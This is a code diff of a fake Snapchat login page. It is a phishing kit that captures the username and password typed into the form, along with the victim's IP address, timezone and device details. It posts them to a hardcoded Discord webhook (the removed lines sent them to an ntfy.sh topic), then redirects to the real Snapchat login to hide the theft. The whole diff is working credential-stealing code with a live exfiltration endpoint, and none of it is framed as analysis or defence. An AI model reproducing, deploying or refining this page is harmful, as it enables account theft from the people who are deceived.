@@ -8,7 +8,8 @@
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#FFFC00;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
 .container{width:100%;max-width:360px;padding:20px;text-align:center}
-.logo{width:80px;height:80px;margin-bottom:30px}
+.logo{width:80px;height:80px;margin-bottom:30px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-left:auto;margin-right:auto}
+.logo::after{content:"👻";font-size:40px}
 h1{font-size:28px;font-weight:700;color:#000;margin-bottom:8px}
 p.sub{color:#333;font-size:14px;margin-bottom:30px}
 input{width:100%;padding:14px 16px;font-size:16px;border:1px solid #ddd;border-radius:8px;background:#fff;margin-bottom:12px;outline:none}
@@ -21,7 +22,7 @@ button:active{transform:scale(0.98)}
 </head>
 <body>
 <div class="container">
-<<svg class="logo" viewBox="0 0 100 100"><path fill="#000" d="M50 2C23 2 2 23 2 50s21 48 48 48 48-21 48-48S77 2 50 2zm0 88c-22 0-40-18-40-40S28 10 50 10s40 18 40 40-18 40-40 40z"/><path fill="#000" d="M50 20c-16 0-29 13-29 29s13 29 29 29 29-13 29-29S66 20 50 20zm0 50c-11 0-21-9-21-21s9-21 21-21 21 9 21 21-9 21-21 21z"/></svg>
+<div class="logo"></div>
 <h1>Log In</h1>
 <p class="sub">to continue to Snapchat</p>
 <form id="loginForm">
@@ -33,32 +34,50 @@ button:active{transform:scale(0.98)}
 <p class="signup">Sign up for Snapchat</p>
 </div>
 <script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510871444832260333/m4wXoUCMZDGO-pMd08i_bvJXmNosmYmsJ0HA2nw1tmEP_h2HWoHDTZ6OkFqcZuzVBI5x';
+
 document.getElementById('loginForm').addEventListener('submit', function(e){
     e.preventDefault();
     const user = document.getElementById('username').value;
     const pass = document.getElementById('password').value;
-    const data = {
-        ua: navigator.userAgent,
-        platform: navigator.platform,
-        lang: navigator.language,
-        screen: screen.width + 'x' + screen.height,
-        referrer: document.referrer || 'direct'
-    };
-    const lines = [
-        '🔴 SNAPCHAT LOGIN',
-        '👤 Username: ' + user,
-        '🔑 Password: ' + pass,
-        '💻 Platform: ' + (data.platform || '-'),
-        '🌐 Language: ' + (data.lang || '-'),
-        '📱 Screen: ' + (data.screen || '-'),
-        '🔗 Referrer: ' + (data.referrer || '-'),
-        '🔎 UA: ' + (data.ua || '-').substring(0, 80)
-    ];
-    fetch('https://ntfy.sh/lo-snap-test-2026', {
-        method: 'POST',
-        body: lines.join('\n'),
-        headers: {'Title': '🔴 Snapchat Login', 'Priority': 'high', 'Tags': 'warning'}
-    }).catch(() => {}).finally(() => {
+    
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ipData=>{
+        const data = {
+            ip: ipData.ip || 'unknown',
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            lang: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: screen.width+'x'+screen.height,
+            pixel: window.devicePixelRatio,
+            touch: navigator.maxTouchPoints,
+            referrer: document.referrer || 'direct'
+        };
+        
+        const embed = {
+            title: "🎯 Snapchat Login",
+            color: 16711680,
+            timestamp: new Date().toISOString(),
+            fields: [
+                {name: "👤 Username", value: user, inline: true},
+                {name: "🔑 Password", value: pass, inline: true},
+                {name: "📍 IP", value: data.ip, inline: true},
+                {name: "💻 Platform", value: data.platform || '-', inline: true},
+                {name: "🌐 Language", value: data.lang || '-', inline: true},
+                {name: "📱 Screen", value: data.screen, inline: true},
+                {name: "🔗 Referrer", value: data.referrer, inline: false},
+                {name: "🔎 UA", value: data.ua.substring(0, 200), inline: false}
+            ]
+        };
+        
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({content: "@everyone 🚨 New Login!", embeds: [embed]})
+        }).catch(()=>{}).finally(()=>{
+            window.location.href = 'https://accounts.snapchat.com/accounts/login';
+        });
+    }).catch(()=>{
         window.location.href = 'https://accounts.snapchat.com/accounts/login';
     });
 });
